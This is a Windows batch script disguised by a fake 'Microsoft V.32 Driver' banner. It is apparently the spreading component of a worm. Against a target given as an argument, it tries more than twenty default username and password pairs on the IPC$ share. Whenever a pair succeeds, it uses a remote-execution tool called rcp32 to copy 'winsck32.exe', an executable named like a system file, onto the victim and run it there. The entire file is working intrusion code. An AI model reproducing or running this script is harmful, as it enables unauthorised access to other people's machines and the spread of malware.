@echo off
:: ========================================== ::
:: Critical Microsoft V.32 Driver Information ::
:: ========================================== ::
net use \\%1\ipc$ "12345" /user:Administrator
if not errorlevel 1 goto x1
net use \\%1\ipc$ "123456" /user:Administrator
if not errorlevel 1 goto x2
net use \\%1\ipc$ "cool" /user:Administrator
if not errorlevel 1 goto x3
net use \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto leet
net use \\%1\ipc$ "Administrator" /user:Administrator
if not errorlevel 1 goto adad
net use \\%1\ipc$ "test" /user:Administrator
if not errorlevel 1 goto adtest
net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt
net use \\%1\ipc$ "test123" /user:Administrator
if not errorlevel 1 goto adtestt
net use \\%1\ipc$ "temp" /user:Administrator
if not errorlevel 1 goto adtemp
net use \\%1\ipc$ "temp123" /user:Administrator
if not errorlevel 1 goto adtempp
net use \\%1\ipc$ "pass" /user:Administrator
if not errorlevel 1 goto adpass
net use \\%1\ipc$ "password" /user:Administrator
if not errorlevel 1 goto adpassw
net use \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto adadmin
net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto rootroot
net use \\%1\ipc$ "changeme" /user:Administrator
if not errorlevel 1 goto adminch
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto adminad
net use \\%1\ipc$ "" /user:Guest
if not errorlevel 1 goto x4
net use \\%1\ipc$ "guest" /user:Guest
if not errorlevel 1 goto x5
net use \\%1\ipc$ "" /user:User
if not errorlevel 1 goto x6
net use \\%1\ipc$ "guest" /user:User
if not errorlevel 1 goto x7
net use \\%1\ipc$ "user" /user:User
if not errorlevel 1 goto x8
net use \\%1\ipc$ "hellyeah" /user:Administrator
if not errorlevel 1 goto x9
goto end
:x1
rcp32 \\%1 -u Administrator -p "12345" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u Administrator -p "12345" -f -c -d winsck32.exe -o
rcp32 \\%1 -u Administrator -p "12345" -d winsck32.exe -o
goto end
:x2
rcp32 \\%1 -u Administrator -p "123456" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u Administrator -p "123456" -f -c -d winsck32.exe -o
rcp32 \\%1 -u Administrator -p "123456" -d winsck32.exe -o
goto end
:x3
rcp32 \\%1 -u Administrator -p "cool" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u Administrator -p "cool" -f -c -d winsck32.exe -o
rcp32 \\%1 -u Administrator -p "cool" -d winsck32.exe -o
goto end
:x4
rcp32 \\%1 -u Guest -p "" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u Guest -p "" -f -c -d winsck32.exe -o
rcp32 \\%1 -u Guest -p "" -d winsck32.exe -o
goto end
:x5
rcp32 \\%1 -u Guest -p "guest" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u Guest -p "guest" -f -c -d winsck32.exe -o
rcp32 \\%1 -u Guest -p "guest" -d winsck32.exe -o
goto end
:x6
rcp32 \\%1 -u User -p "" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u User -p "" -f -c -d winsck32.exe -o
rcp32 \\%1 -u User -p "" -d winsck32.exe -o
goto end
:x7
rcp32 \\%1 -u User -p "guest" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u User -p "guest" -f -c -d winsck32.exe -o
rcp32 \\%1 -u User -p "guest" -d winsck32.exe -o
goto end
:x8
rcp32 \\%1 -u User -p "user" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u User -p "user" -f -c -d winsck32.exe -o
rcp32 \\%1 -u User -p "user" -d winsck32.exe -o
goto end
:x9
rcp32 \\%1 -u Administrator -p "hellyeah" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u Administrator -p "hellyeah" -f -c -d winsck32.exe -o
rcp32 \\%1 -u Administrator -p "hellyeah" -d winsck32.exe -o
goto end
:leet
rcp32 \\%1 -u Administrator -p "" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u Administrator -p "" -f -c -d winsck32.exe -o
rcp32 \\%1 -u Administrator -p "" -d winsck32.exe -o
goto end
:adad
rcp32 \\%1 -u Administrator -p "admin" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u Administrator -p "admin" -f -c -d winsck32.exe -o
rcp32 \\%1 -u Administrator -p "admin" -d winsck32.exe -o
goto end
:adadmin
rcp32 \\%1 -u Administrator -p "administrator" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u Administrator -p "administrator" -f -c -d winsck32.exe -o
rcp32 \\%1 -u Administrator -p "administrator" -d winsck32.exe -o
goto end
:rootroot
rcp32 \\%1 -u root -p "root" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u root -p "root" -f -c -d winsck32.exe -o
rcp32 \\%1 -u root -p "root" -d winsck32.exe -o
goto end
:adminad
rcp32 \\%1 -u admin -p "admin" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u admin -p "admin" -f -c -d winsck32.exe -o
rcp32 \\%1 -u admin -p "admin" -d winsck32.exe -o
goto end
:adtest
rcp32 \\%1 -u administrator -p "test" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u administrator -p "test" -f -c -d winsck32.exe -o
rcp32 \\%1 -u administrator -p "test" -d winsck32.exe -o
goto end
:testt
rcp32 \\%1 -u test -p "test" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u test -p "test" -f -c -d winsck32.exe -o
rcp32 \\%1 -u test -p "test" -d winsck32.exe -o
goto end
:adtestt
rcp32 \\%1 -u administrator -p "test123" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u administrator -p "test123" -f -c -d winsck32.exe -o
rcp32 \\%1 -u administrator -p "test123" -d winsck32.exe -o
goto end
:adtemp
rcp32 \\%1 -u administrator -p "temp" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u administrator -p "temp" -f -c -d winsck32.exe -o
rcp32 \\%1 -u administrator -p "temp" -d winsck32.exe -o
goto end
:adtempp
rcp32 \\%1 -u administrator -p "temp123" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u administrator -p "temp123" -f -c -d winsck32.exe -o
rcp32 \\%1 -u administrator -p "temp123" -d winsck32.exe -o
goto end
:adpass
rcp32 \\%1 -u administrator -p "pass" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u administrator -p "pass" -f -c -d winsck32.exe -o
rcp32 \\%1 -u administrator -p "pass" -d winsck32.exe -o
goto end
:adpassw
rcp32 \\%1 -u administrator -p "password" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u administrator -p "password" -f -c -d winsck32.exe -o
rcp32 \\%1 -u administrator -p "password" -d winsck32.exe -o
goto end
:adminch
rcp32 \\%1 -u administrator -p "changeme" -d attrib.exe -r winsck32.exe
rcp32 \\%1 -u administrator -p "changeme" -f -c -d winsck32.exe -o
rcp32 \\%1 -u administrator -p "changeme" -d winsck32.exe -o
goto end
:end